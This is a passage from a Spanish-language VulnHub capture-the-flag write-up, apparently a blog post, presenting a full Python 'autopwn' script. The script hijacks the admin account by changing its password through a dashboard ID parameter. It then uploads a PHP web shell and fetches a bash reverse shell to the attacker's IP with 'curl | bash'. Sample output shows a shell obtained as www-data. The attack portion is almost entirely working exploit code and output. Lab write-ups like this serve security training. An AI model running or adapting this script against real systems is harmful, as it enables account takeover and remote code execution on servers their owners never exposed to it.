+</span><span class="n">urlAdmin</span> <span class="o">=</span> <span class="sa">f</span><span class="s">'http://</span><span class="si">{</span><span class="n">ipVic</span><span class="si">}</span><span class="s">/dashboard.php?id=1'</span>
+<span class="n">urlRegister</span><span class="o">=</span> <span class="sa">f</span><span class="s">'http://</span><span class="si">{</span><span class="n">ipVic</span><span class="si">}</span><span class="s">/register.php'</span>
+<span class="n">urlLogin</span><span class="o">=</span> <span class="sa">f</span><span class="s">'http://</span><span class="si">{</span><span class="n">ipVic</span><span class="si">}</span><span class="s">/login.php'</span>
+
+<span class="n">usr</span><span class="o">=</span> <span class="s">"testo"</span>
+<span class="n">passw</span><span class="o">=</span> <span class="s">"testo"</span>
+
+<span class="n">s</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">Session</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p>Tenemos la función que se encarga de registrar un usuario:</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">register</span><span class="p">():</span>
+
+    <span class="n">post_data</span> <span class="o">=</span> <span class="p">{</span> 
+        <span class="s">"username"</span><span class="p">:</span> <span class="sa">f</span><span class="s">'</span><span class="si">{</span><span class="n">usr</span><span class="si">}</span><span class="s">'</span><span class="p">,</span>
+        <span class="s">"email"</span><span class="p">:</span> <span class="sa">f</span><span class="s">'</span><span class="si">{</span><span class="n">usr</span><span class="si">}</span><span class="s">%20</span><span class="si">{</span><span class="n">usr</span><span class="si">}</span><span class="s">'</span><span class="p">,</span>
+        <span class="s">"password"</span><span class="p">:</span> <span class="sa">f</span><span class="s">'</span><span class="si">{</span><span class="n">passw</span><span class="si">}</span><span class="s">'</span>
+     <span class="p">}</span>
+
+    <span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">urlRegister</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">post_data</span><span class="p">)</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">"[+] Usuario creado"</span><span class="p">)</span>
+</code></pre></div></div>
+<p>La siguiente de iniciar sesión:</p>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">login</span><span class="p">():</span>
+
+    <span class="n">post_data</span> <span class="o">=</span> <span class="p">{</span> 
+       <span class="s">"username"</span><span class="p">:</span> <span class="sa">f</span><span class="s">'</span><span class="si">{</span><span class="n">usr</span><span class="si">}</span><span class="s">'</span><span class="p">,</span>
+       <span class="s">"password"</span><span class="p">:</span> <span class="sa">f</span><span class="s">'</span><span class="si">{</span><span class="n">passw</span><span class="si">}</span><span class="s">'</span>
+     <span class="p">}</span>
+
+    <span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">urlLogin</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">post_data</span><span class="p">)</span>
+</code></pre></div></div>
+<p>La que sigue se encarga de cambiarle la contraseña al usuario admin:</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">changePass</span><span class="p">():</span>
+
+    <span class="n">post_data</span><span class="o">=</span> <span class="p">{</span>
+
+        <span class="s">"password"</span><span class="p">:</span> <span class="s">"password"</span><span class="p">,</span>
+        <span class="s">"id"</span><span class="p">:</span> <span class="s">"1"</span>
+
+    <span class="p">}</span>
+    <span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">urlIndex</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">post_data</span><span class="p">)</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">"[+] Contraseña de admin cambiada con éxito"</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>Luego, tenemos el inicio de sesión como admin:</p>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">loginadmin</span><span class="p">():</span>
+
+     <span class="n">post_data</span> <span class="o">=</span> <span class="p">{</span> 
+       <span class="s">"username"</span><span class="p">:</span> <span class="s">"admin"</span><span class="p">,</span>
+       <span class="s">"password"</span><span class="p">:</span> <span class="s">"password"</span>
+     <span class="p">}</span>
+
+     <span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">urlLogin</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">post_data</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>La siguiente función se encarga de subir el archivo malicioso a la máquina víctima:</p>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">upload</span><span class="p">():</span>
+
+        <span class="n">payload</span> <span class="o">=</span> <span class="s">"""  &lt;?php echo "&lt;pre&gt;" . shell_exec($_REQUEST['cmd']) . "&lt;/pre&gt;"; ?&gt; """</span> 
+
+        <span class="n">files</span>  <span class="o">=</span> <span class="p">{</span><span class="s">'fileToUpload'</span><span class="p">:(</span><span class="s">'shell.phtml'</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
+
+            <span class="p">}</span>
+        <span class="k">print</span><span class="p">(</span><span class="s">"[+] Subiendo archivo malicoso"</span><span class="p">)</span>
+        <span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">urlAdmin</span><span class="p">,</span><span class="n">files</span><span class="o">=</span><span class="n">files</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>Finalmente, tenemos la función que crea el index.html y el servidor http:</p>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">html_payload</span><span class="p">():</span>
+
+    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">"index.html"</span><span class="p">,</span><span class="s">"w"</span><span class="p">)</span> <span class="k">as</span> <span class="nb">file</span><span class="p">:</span>
+        <span class="n">Shebang</span> <span class="o">=</span> <span class="s">"#!/bin/bash</span><span class="se">\n</span><span class="s">"</span>
+        <span class="n">payload</span> <span class="o">=</span><span class="sa">f</span><span class="s">'bash -i &gt;&amp; /dev/tcp/</span><span class="si">{</span><span class="n">ipHost</span><span class="si">}</span><span class="s">/1234 0&gt;&amp;1'</span>
+        <span class="nb">file</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">Shebang</span><span class="p">)</span>
+        <span class="nb">file</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">http_server</span><span class="p">():</span>
+
+    <span class="k">try</span><span class="p">:</span>
+        <span class="k">with</span> <span class="n">socket</span><span class="p">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span> <span class="k">as</span> <span class="n">so</span><span class="p">:</span>
+            <span class="n">so</span><span class="p">.</span><span class="n">bind</span><span class="p">((</span><span class="s">'localhost'</span><span class="p">,</span> <span class="mi">80</span><span class="p">))</span>
+            <span class="n">http_server</span> <span class="o">=</span> <span class="n">subprocess</span><span class="p">.</span><span class="n">Popen</span><span class="p">([</span><span class="s">"python3"</span><span class="p">,</span> <span class="s">"-m"</span><span class="p">,</span> <span class="s">"http.server"</span><span class="p">,</span> <span class="s">"80"</span><span class="p">])</span>
+    <span class="k">except</span> <span class="nb">OSError</span><span class="p">:</span>
+            <span class="k">print</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">[-] El puerto 80 se encuentra en uso, no se ha podido ejectuar el servidor"</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>Si lo ejecutamos:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python subida.py 192.168.233.128 192.168.233.129
+[!] Asegurarse de no haber creado ningún usuario, en caso contrario modificar el id en urlIndex
+[+] Usuario creado
+[+] Contraseña de admin cambiada con éxito
+[+] Subiendo archivo malicoso
+[+] Trying to bind to :: on port 1234: Done
+[+] Waiting for connections on :::1234: Got connection from ::ffff:192.168.233.129 on port 60244
+[*] Switching to interactive mode
+bash: cannot set terminal process group (88930): Inappropriate ioctl for device
+bash: no job control in this shell
+bash-5.0$ $ whoami
+whoami
+www-data
+</code></pre></div></div>
+
+<p>El código completo es este:</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">requests</span><span class="p">,</span><span class="n">subprocess</span><span class="p">,</span><span class="n">socket</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="k">def</span> <span class="nf">def_handler</span><span class="p">(</span><span class="n">sig</span><span class="p">,</span> <span class="n">frame</span><span class="p">):</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">"</span><span class="se">\n\n</span><span class="s">[!] saliendo...</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+    <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+<span class="n">signal</span><span class="p">.</span><span class="n">signal</span><span class="p">(</span><span class="n">signal</span><span class="p">.</span><span class="n">SIGINT</span><span class="p">,</span> <span class="n">def_handler</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="p">:</span>
+    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">'[!] Uso: python3 </span><span class="si">{</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="si">}</span><span class="s"> "Tu IP"  "Ip de la víctima"</span><span class="se">\n</span><span class="s">'</span> <span class="p">)</span>
+    <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+<span class="k">print</span><span class="p">(</span><span class="s">"[!] Asegurarse de no haber creado ningún usuario, en caso contrario modificar el id en urlIndex"</span><span class="p">)</span>
+<span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">ipHost</span><span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+<span class="n">ipVic</span><span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
+
+<span class="n">urlIndex</span> <span class="o">=</span> <span class="sa">f</span><span class="s">'http://</span><span class="si">{</span><span class="n">ipVic</span><span class="si">}</span><span class="s">/dashboard.php?id=2'</span> <span class="c1"># Modificar id si ya has creado usuarios.
+</span><span class="n">urlAdmin</span> <span class="o">=</span> <span class="sa">f</span><span class="s">'http://</span><span class="si">{</span><span class="n">ipVic</span><span class="si">}</span><span class="s">/dashboard.php?id=1'</span>
+<span class="n">urlRegister</span><span class="o">=</span> <span class="sa">f</span><span class="s">'http://</span><span class="si">{</span><span class="n">ipVic</span><span class="si">}</span><span class="s">/register.php'</span>
+<span class="n">urlLogin</span><span class="o">=</span> <span class="sa">f</span><span class="s">'http://</span><span class="si">{</span><span class="n">ipVic</span><span class="si">}</span><span class="s">/login.php'</span>
+
+<span class="n">usr</span><span class="o">=</span> <span class="s">"testo"</span>
+<span class="n">passw</span><span class="o">=</span> <span class="s">"testo"</span>
+
+<span class="n">s</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">Session</span><span class="p">()</span>
+
+<span class="k">def</span> <span class="nf">register</span><span class="p">():</span>
+
+    <span class="n">post_data</span> <span class="o">=</span> <span class="p">{</span> 
+        <span class="s">"username"</span><span class="p">:</span> <span class="sa">f</span><span class="s">'</span><span class="si">{</span><span class="n">usr</span><span class="si">}</span><span class="s">'</span><span class="p">,</span>
+        <span class="s">"email"</span><span class="p">:</span> <span class="sa">f</span><span class="s">'</span><span class="si">{</span><span class="n">usr</span><span class="si">}</span><span class="s">%20</span><span class="si">{</span><span class="n">usr</span><span class="si">}</span><span class="s">'</span><span class="p">,</span>
+        <span class="s">"password"</span><span class="p">:</span> <span class="sa">f</span><span class="s">'</span><span class="si">{</span><span class="n">passw</span><span class="si">}</span><span class="s">'</span>
+     <span class="p">}</span>
+
+    <span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">urlRegister</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">post_data</span><span class="p">)</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">"[+] Usuario creado"</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">login</span><span class="p">():</span>
+
+    <span class="n">post_data</span> <span class="o">=</span> <span class="p">{</span> 
+       <span class="s">"username"</span><span class="p">:</span> <span class="sa">f</span><span class="s">'</span><span class="si">{</span><span class="n">usr</span><span class="si">}</span><span class="s">'</span><span class="p">,</span>
+       <span class="s">"password"</span><span class="p">:</span> <span class="sa">f</span><span class="s">'</span><span class="si">{</span><span class="n">passw</span><span class="si">}</span><span class="s">'</span>
+     <span class="p">}</span>
+
+    <span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">urlLogin</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">post_data</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">changePass</span><span class="p">():</span>
+
+    <span class="n">post_data</span><span class="o">=</span> <span class="p">{</span>
+
+        <span class="s">"password"</span><span class="p">:</span> <span class="s">"password"</span><span class="p">,</span>
+        <span class="s">"id"</span><span class="p">:</span> <span class="s">"1"</span>
+
+    <span class="p">}</span>
+    <span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">urlIndex</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">post_data</span><span class="p">)</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">"[+] Contraseña de admin cambiada con éxito"</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">loginadmin</span><span class="p">():</span>
+
+     <span class="n">post_data</span> <span class="o">=</span> <span class="p">{</span> 
+       <span class="s">"username"</span><span class="p">:</span> <span class="s">"admin"</span><span class="p">,</span>
+       <span class="s">"password"</span><span class="p">:</span> <span class="s">"password"</span>
+     <span class="p">}</span>
+
+     <span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">urlLogin</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">post_data</span><span class="p">)</span>
+
+
+<span class="k">def</span> <span class="nf">upload</span><span class="p">():</span>
+
+        <span class="n">payload</span> <span class="o">=</span> <span class="s">"""  &lt;?php echo "&lt;pre&gt;" . shell_exec($_REQUEST['cmd']) . "&lt;/pre&gt;"; ?&gt; """</span> 
+
+        <span class="n">files</span>  <span class="o">=</span> <span class="p">{</span><span class="s">'fileToUpload'</span><span class="p">:(</span><span class="s">'shell.phtml'</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
+
+            <span class="p">}</span>
+        <span class="k">print</span><span class="p">(</span><span class="s">"[+] Subiendo archivo malicoso"</span><span class="p">)</span>
+        <span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">urlAdmin</span><span class="p">,</span><span class="n">files</span><span class="o">=</span><span class="n">files</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">html_payload</span><span class="p">():</span>
+
+    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">"index.html"</span><span class="p">,</span><span class="s">"w"</span><span class="p">)</span> <span class="k">as</span> <span class="nb">file</span><span class="p">:</span>
+        <span class="n">Shebang</span> <span class="o">=</span> <span class="s">"#!/bin/bash</span><span class="se">\n</span><span class="s">"</span>
+        <span class="n">payload</span> <span class="o">=</span><span class="sa">f</span><span class="s">'bash -i &gt;&amp; /dev/tcp/</span><span class="si">{</span><span class="n">ipHost</span><span class="si">}</span><span class="s">/1234 0&gt;&amp;1'</span>
+        <span class="nb">file</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">Shebang</span><span class="p">)</span>
+        <span class="nb">file</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">http_server</span><span class="p">():</span>
+
+    <span class="k">try</span><span class="p">:</span>
+        <span class="k">with</span> <span class="n">socket</span><span class="p">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span> <span class="k">as</span> <span class="n">so</span><span class="p">:</span>
+            <span class="n">so</span><span class="p">.</span><span class="n">bind</span><span class="p">((</span><span class="s">'localhost'</span><span class="p">,</span> <span class="mi">80</span><span class="p">))</span>
+            <span class="n">http_server</span> <span class="o">=</span> <span class="n">subprocess</span><span class="p">.</span><span class="n">Popen</span><span class="p">([</span><span class="s">"python3"</span><span class="p">,</span> <span class="s">"-m"</span><span class="p">,</span> <span class="s">"http.server"</span><span class="p">,</span> <span class="s">"80"</span><span class="p">])</span>
+    <span class="k">except</span> <span class="nb">OSError</span><span class="p">:</span>
+            <span class="k">print</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">[-] El puerto 80 se encuentra en uso, no se ha podido ejectuar el servidor"</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">conection</span><span class="p">():</span>
+
+    <span class="n">ip</span> <span class="o">=</span> <span class="sa">f</span><span class="s">'http://</span><span class="si">{</span><span class="n">ipVic</span><span class="si">}</span><span class="s">/upload/shell.phtml?cmd=curl%20</span><span class="si">{</span><span class="n">ipHost</span><span class="si">}</span><span class="s">%20|%20bash'</span>
+    <span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">ip</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
+    <span class="n">html_payload</span><span class="p">()</span>
+    <span class="n">http_server</span><span class="p">()</span>
+    <span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+    <span class="n">register</span><span class="p">()</span>
+    <span class="n">login</span><span class="p">()</span>
+    <span class="n">changePass</span><span class="p">()</span>
+    <span class="n">loginadmin</span><span class="p">()</span>
+    <span class="n">upload</span><span class="p">()</span>
+    <span class="n">threading</span><span class="p">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">conection</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="p">()).</span><span class="n">start</span><span class="p">()</span>
+    <span class="n">shell</span> <span class="o">=</span> <span class="n">listen</span><span class="p">(</span><span class="mi">1234</span><span class="p">,</span><span class="n">timeout</span><span class="o">=</span><span class="mi">20</span><span class="p">).</span><span class="n">wait_for_connection</span><span class="p">()</span>
+    <span class="n">shell</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+<p>¡Listo!, hemos terminado la automatización de la intrusión.</p>
+
+<p>Nos vemos, hasta la próxima.</p>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#abusing-sesion-system" class="page__taxonomy-item" rel="tag">Abusing sesion system</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#arbitrary-file-upload" class="page__taxonomy-item" rel="tag">Arbitrary file upload</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#autopwn" class="page__taxonomy-item" rel="tag">Autopwn</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#enumeration" class="page__taxonomy-item" rel="tag">Enumeration</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#linux" class="page__taxonomy-item" rel="tag">Linux</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#path-hijacking" class="page__taxonomy-item" rel="tag">Path hijacking</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#suid" class="page__taxonomy-item" rel="tag">SUID</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#web" class="page__taxonomy-item" rel="tag">Web</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#easy" class="page__taxonomy-item" rel="tag">Easy</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/categories/#linux" class="page__taxonomy-item" rel="tag">Linux</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/categories/#vulnhub" class="page__taxonomy-item" rel="tag">VulnHub</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/categories/#write-up" class="page__taxonomy-item" rel="tag">Write up</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Fecha:</strong> <time datetime="2023-02-20T00:00:00-05:00">February 20, 2023</time></p>
+        
+      </footer>
+
+      
+
+      
+  <nav class="pagination">
+    
+      <a href="/Chaos/" class="pagination--pager" title="Chaos HTB Write-up
+">Previous</a>
+    
+    
+      <a href="/DarkHole_2/" class="pagination--pager" title="Dark hole 2 VulnHub Write-up
+">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+</div>
+
+    </div>
+
+    
+
+    <div class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+
+    
+
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">© 2023 grafis</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>
+
+
+
+
+
+
+
+
+  </body>
+</html>
